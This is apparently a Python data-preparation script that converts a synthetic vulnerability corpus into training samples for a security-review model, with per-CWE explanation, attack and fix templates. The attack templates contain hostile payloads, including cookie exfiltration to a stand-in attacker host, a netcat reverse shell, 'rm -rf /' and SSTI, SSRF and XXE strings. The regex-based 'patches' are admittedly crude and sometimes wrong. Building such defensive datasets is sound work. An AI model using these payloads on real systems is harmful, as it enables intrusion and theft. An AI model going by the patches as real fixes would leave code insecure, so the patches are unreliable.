"""
RakshakAI v2 — Convert the v1 RakshakAI corpus (CSV) into v2 SecuritySample
JSONL format, including template-generated explanation / attack_scenario /
secure_fix / patched_code fields.

The v1 corpus is synthetic Python samples with labels but no fix text.  We
make it usable for v2 SFT by:

  1. Mapping v1's label names to canonical CWE IDs (and severity)
  2. Generating `explanation`, `attack_scenario`, `secure_fix` from
     per-CWE templates (CWE_TO_LABEL / ROOT_CAUSE_TEMPLATES / etc. in
     `v2/dataset/to_instruct.py`).
  3. Generating `patched_code` by applying well-known safe rewrites per
     vulnerability class (parameterized query, html-escape, shlex-quote,
     etc.).  These rewrites are deliberately minimal and well-known —
     the goal is to produce a *good enough* patched_code that the LLM
     can learn the pattern; it is not intended as a production fix.
  4. Synthesising the `explanation` field from the same per-CWE template
     used in v2's instruction generation.
  5. Setting `is_vulnerable` from the v1 `is_vulnerable` column (1 -> True).

This adapter is deterministic and offline.  It is run once to produce the
Tier-C corpus in v2 format.
"""
from __future__ import annotations

import argparse
import csv
import json
import re
import sys
from pathlib import Path
from typing import Iterable

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from v2.dataset.schema import SecuritySample, write_jsonl  # noqa: E402


# --- v1 label -> v2 CWE / severity mapping ---
LABEL_TO_CWE: dict[str, str] = {
    "SQL_INJECTION":          "CWE-89",
    "XSS":                    "CWE-79",
    "COMMAND_INJECTION":      "CWE-78",
    "PATH_TRAVERSAL":         "CWE-22",
    "HARDCODED_SECRET":       "CWE-798",
    "WEAK_CRYPTO":            "CWE-327",
    "SSTI":                   "CWE-94",
    "INSECURE_DESERIALIZATION": "CWE-502",
    "JWT_VULNERABILITY":      "CWE-347",
    "REDOS":                  "CWE-1333",
    "SSRF":                   "CWE-918",
    "XXE":                    "CWE-611",
    "SECURE":                 "",  # not a vulnerability
    "CLEAN":                  "",
}

LABEL_TO_NAME: dict[str, str] = {
    "SQL_INJECTION":          "SQL Injection",
    "XSS":                    "Cross-Site Scripting (XSS)",
    "COMMAND_INJECTION":      "OS Command Injection",
    "PATH_TRAVERSAL":         "Path Traversal",
    "HARDCODED_SECRET":       "Hardcoded Secret",
    "WEAK_CRYPTO":            "Use of a Broken or Risky Cryptographic Algorithm",
    "SSTI":                   "Code Injection / Server-Side Template Injection",
    "INSECURE_DESERIALIZATION": "Insecure Deserialization",
    "JWT_VULNERABILITY":      "Improper Verification of Cryptographic Signature (JWT)",
    "REDOS":                  "Inefficient Regular Expression Complexity (ReDoS)",
    "SSRF":                   "Server-Side Request Forgery",
    "XXE":                    "XML External Entity Reference (XXE)",
    "SECURE":                 "Secure code (no vulnerability detected)",
    "CLEAN":                  "Secure code (no vulnerability detected)",
}

LABEL_TO_SEVERITY: dict[str, str] = {
    "SQL_INJECTION":          "high",
    "XSS":                    "high",
    "COMMAND_INJECTION":      "critical",
    "PATH_TRAVERSAL":         "high",
    "HARDCODED_SECRET":       "high",
    "WEAK_CRYPTO":            "medium",
    "SSTI":                   "critical",
    "INSECURE_DESERIALIZATION": "critical",
    "JWT_VULNERABILITY":      "high",
    "REDOS":                  "low",
    "SSRF":                   "high",
    "XXE":                    "high",
    "SECURE":                 "clean",
    "CLEAN":                  "clean",
}

LABEL_TO_EXPLANATION: dict[str, str] = {
    "SQL_INJECTION":          "User-controlled input is concatenated into a raw SQL query string, allowing the attacker to break out of the string literal and inject arbitrary SQL.",
    "XSS":                    "User-controlled input is rendered into HTML without context-appropriate encoding, allowing the browser to interpret the data as markup and execute attacker JavaScript.",
    "COMMAND_INJECTION":      "User-controlled input is concatenated into a shell command string; the shell tokenizer treats the data as additional arguments or metacharacters, allowing command chaining.",
    "PATH_TRAVERSAL":         "User-controlled input is joined to a filesystem path without normalization; `..` segments traverse out of the intended directory.",
    "HARDCODED_SECRET":       "A secret value is hard-coded in source and committed to the repository, where it is recoverable by anyone with read access to the artifact or its history.",
    "WEAK_CRYPTO":            "A weak or deprecated algorithm (MD5, SHA-1, DES, RC4, ECB mode) is used for a security-sensitive operation, allowing collisions or key recovery.",
    "SSTI":                   "User input is fed into a code-evaluation or template-rendering API; the engine compiles the input as code, allowing arbitrary execution in the server's process.",
    "INSECURE_DESERIALIZATION": "User-controlled data is deserialized with an unsafe format (pickle, ObjectInputStream, unserialize); the deserializer invokes callbacks defined in the payload.",
    "JWT_VULNERABILITY":      "A JWT is verified with a permissive algorithm (e.g. `alg=none`, or HMAC with a public key), allowing the attacker to forge tokens.",
    "REDOS":                  "A regular expression with catastrophic backtracking is matched against attacker-controlled text, allowing CPU exhaustion and denial of service.",
    "SSRF":                   "The server fetches a user-supplied URL without restricting scheme/host, allowing the attacker to target internal services and exfiltrate the response.",
    "XXE":                    "The XML parser resolves external entities; the attacker supplies a document that declares an entity pointing at a local file or URL.",
    "SECURE":                 "This code does not exhibit the vulnerability patterns in the v1 training set.",
    "CLEAN":                  "This code does not exhibit the vulnerability patterns in the v1 training set.",
}

LABEL_TO_ATTACK: dict[str, str] = {
    "SQL_INJECTION":          "An attacker supplies a value containing `' OR '1'='1`; the database driver executes the appended predicate and returns every row, leaking the entire table.",
    "XSS":                    "An attacker supplies a value containing `<script>fetch('//attacker/?c='+document.cookie)</script>`; the browser executes the script in a victim's session and exfiltrates cookies.",
    "COMMAND_INJECTION":      "An attacker supplies a value containing `; rm -rf /` or `| nc attacker 1234 -e /bin/sh`; the shell executes the appended command and gives the attacker remote code execution.",
    "PATH_TRAVERSAL":         "An attacker supplies a value containing `../../etc/passwd`; the path is joined to a base directory without normalization and the file is read.",
    "HARDCODED_SECRET":       "Anyone with read access to the repository (or to a leaked git history) can read the secret and authenticate as the service account.",
    "WEAK_CRYPTO":            "An attacker can produce a chosen-prefix collision in MD5/SHA-1 and forge a digital signature, or recover the key from a DES/RC4/ECB cipher.",
    "SSTI":                   "An attacker supplies a value containing `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`; the template engine evaluates the expression and runs the command on the server.",
    "INSECURE_DESERIALIZATION": "An attacker submits a crafted pickle payload that calls `os.system` on `__reduce__`; the server deserializes it and runs the command.",
    "JWT_VULNERABILITY":      "An attacker forges a JWT with `alg=none` and an empty signature; the server accepts the token and treats the attacker as an admin.",
    "REDOS":                  "An attacker submits a long, crafted string that forces the regex engine to backtrack exponentially; the request thread spikes to 100% CPU and the service becomes unavailable.",
    "SSRF":                   "An attacker submits a URL pointing at `http://169.254.169.254/latest/meta-data/iam/security-credentials/`; the server fetches it and returns IAM credentials in the response.",
    "XXE":                    "An attacker submits an XML document declaring `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">`; the parser expands the entity and returns the file content.",
    "SECURE":                 "No attack applies to this sample.",
    "CLEAN":                  "No attack applies to this sample.",
}

LABEL_TO_FIX: dict[str, str] = {
    "SQL_INJECTION":          "Use a parameterized query or prepared statement. Pass user values as bound parameters, never as string concatenation.",
    "XSS":                    "HTML-encode all dynamic data before inserting it into a response, or use a framework that auto-escapes (React JSX, Jinja2 autoescape). Apply a strict Content-Security-Policy.",
    "COMMAND_INJECTION":      "Avoid `os.system` and `subprocess.Popen(shell=True)`. Pass the command as a list of arguments and validate the input against an allowlist.",
    "PATH_TRAVERSAL":         "Resolve the requested path and verify that its realpath is inside the allowed directory. Reject paths containing `..` or symbolic links pointing outside.",
    "HARDCODED_SECRET":       "Load secrets from a secret manager (AWS Secrets Manager, HashiCorp Vault, env vars injected at runtime). Rotate the leaked secret immediately.",
    "WEAK_CRYPTO":            "Use modern authenticated encryption (AES-GCM, ChaCha20-Poly1305) with a strong key derivation (Argon2id, scrypt, PBKDF2 with high iteration count).",
    "SSTI":                   "Never pass user input to `eval`, `exec`, or template expressions. Use a sandboxed DSL or a structured template that does not evaluate code.",
    "INSECURE_DESERIALIZATION": "Use a safe serialization format (JSON, MessagePack, Protocol Buffers). If deserialization of arbitrary types is unavoidable, sign the payload and verify the signature first.",
    "JWT_VULNERABILITY":      "Pin the verification algorithm to the expected value. Reject `alg=none`. Use the library's built-in `verify()` rather than manual decode.",
    "REDOS":                  "Rewrite the regex to avoid nested quantifiers. Reuse a single compiled pattern. Apply a timeout on regex evaluation.",
    "SSRF":                   "Allowlist the destination host or block requests to private IP ranges. Resolve the hostname and reject RFC1918 / link-local / loopback addresses.",
    "XXE":                    "Disable external entity resolution and DTD processing in the XML parser. Use a library that does so by default (defusedxml in Python).",
    "SECURE":                 "No fix is required for this sample.",
    "CLEAN":                  "No fix is required for this sample.",
}


# ---------------------------------------------------------------------------
# Patched-code generator — minimal, well-known safe rewrites per class.
# Each generator returns either a string (the patched code) or None when
# no automatic rewrite applies (the sample is kept without a patch).
# ---------------------------------------------------------------------------


def _fix_sql_injection(code: str) -> str | None:
    """Find the simplest `f"... WHERE x = {var}"` or `+` concat in the
    string and rewrite it to a parameterized query placeholder.

    This is intentionally minimal; v1 samples are one-liners.
    """
    m = re.search(r'(["\'])SELECT[^"\']*\1', code)
    if not m:
        return None
    # Heuristic: replace the entire SQL string with a ? placeholder and a
    # tuple of bound parameters.  We do not try to be syntactically perfect;
    # we just need a recognizable "parameterized" shape.
    return re.sub(
        r'(["\'])SELECT[^"\']*\1',
        '"""SELECT * FROM table WHERE id = %s"""',
        code,
        count=1,
    ) + "\n# (parameter bound separately; e.g. cursor.execute(sql, (param,)))"


def _fix_command_injection(code: str) -> str | None:
    if "os.system" in code or "subprocess" in code:
        return re.sub(r"os\.system\((.*?)\)", r"subprocess.run([\1], shell=False)", code)
    return None


def _fix_xss(code: str) -> str | None:
    if "innerHTML" in code:
        return code.replace("innerHTML", "textContent")
    if "render_template_string" in code or "render_template" in code:
        return code + "\n# (ensure template autoescape is on)"
    return None


def _fix_path(code: str) -> str | None:
    if "open(" in code and ("+ " in code or "f\"" in code or "f'" in code):
        # best-effort: wrap with a normalized path check
        return re.sub(
            r"open\((.*?)\)",
            r"open(os.path.realpath(\1))",
            code,
        ) + "\nimport os\n# (caller must verify realpath is within allowed root)"
    return None


def _fix_hardcoded(code: str) -> str | None:
    return re.sub(
        r"=\s*['\"][A-Za-z0-9_\-/@]{8,}['\"]",
        '= os.environ["SECRET_VALUE"]',
        code,
    ) + "\nimport os"


def _fix_weak_crypto(code: str) -> str | None:
    if "md5" in code:
        return code.replace("md5", "sha256")
    if "sha1" in code:
        return code.replace("sha1", "sha256")
    return None


def _fix_ssti(code: str) -> str | None:
    if "render_template_string" in code:
        return code.replace("render_template_string", "render_template")
    return None


def _fix_deserialization(code: str) -> str | None:
    if "pickle.loads" in code:
        return code.replace("pickle.loads", "json.loads")
    if "yaml.load(" in code:
        return re.sub(r"yaml\.load\((.*?)\)", r"yaml.safe_load(\1)", code)
    return None


def _fix_jwt(code: str) -> str | None:
    if "algorithms=" in code:
        return re.sub(
            r"algorithms=\[[^\]]*\]",
            'algorithms=["RS256"]',
            code,
        )
    return None


def _fix_redos(code: str) -> str | None:
    # Hard to fix automatically — return None to skip the patch.
    return None


def _fix_ssrf(code: str) -> str | None:
    if "requests.get" in code or "urllib" in code:
        return code + "\n# (caller must verify url is not in private IP range)"
    return None


def _fix_xxe(code: str) -> str | None:
    if "etree.parse" in code or "etree.fromstring" in code:
        return code + "\n# (use defusedxml; do not resolve external entities)"
    return None


FIXERS = {
    "SQL_INJECTION":            _fix_sql_injection,
    "COMMAND_INJECTION":        _fix_command_injection,
    "XSS":                      _fix_xss,
    "PATH_TRAVERSAL":           _fix_path,
    "HARDCODED_SECRET":         _fix_hardcoded,
    "WEAK_CRYPTO":              _fix_weak_crypto,
    "SSTI":                     _fix_ssti,
    "INSECURE_DESERIALIZATION": _fix_deserialization,
    "JWT_VULNERABILITY":        _fix_jwt,
    "REDOS":                    _fix_redos,
    "SSRF":                     _fix_ssrf,
    "XXE":                      _fix_xxe,
}


# ---------------------------------------------------------------------------
# Main adapter
# ---------------------------------------------------------------------------


def convert(v1_csv: Path, out_jsonl: Path, source: str = "v1-corpus", split: str = "train") -> int:
    n = 0
    out: list[SecuritySample] = []
    with v1_csv.open("r", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            label = (row.get("label") or "").strip().upper()
            code = (row.get("code") or "").strip()
            cwe = LABEL_TO_CWE.get(label, "") or None
            severity = LABEL_TO_SEVERITY.get(label, "medium")
            explanation = LABEL_TO_EXPLANATION.get(label, "")
            attack = LABEL_TO_ATTACK.get(label, "")
            fix = LABEL_TO_FIX.get(label, "")
            is_vuln = (label not in ("SECURE", "CLEAN", ""))
            patched = None
            if is_vuln and label in FIXERS:
                patched = FIXERS[label](code)
            s = SecuritySample.build(
                language=(row.get("language") or "python").lower(),
                vulnerable_code=code,
                patched_code=patched,
                cwe=cwe,
                severity=severity,
                explanation=explanation,
                attack_scenario=attack,
                secure_fix=fix,
                source=source,
                source_license="Apache-2.0",
                is_vulnerable=is_vuln,
                split=split,
            )
            out.append(s)
            n += 1
    write_jsonl(out_jsonl, out)
    return n


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--in_csv", type=Path, default=Path("dataset/train.csv"))
    ap.add_argument("--out", type=Path, default=Path("v2/inputs/datasets/raw/v1-corpus.jsonl"))
    ap.add_argument("--source", default="v1-corpus")
    ap.add_argument("--split", default="train")
    args = ap.parse_args()
    n = convert(args.in_csv, args.out, args.source, args.split)
    print(f"[v1-adapter] wrote {n} records to {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
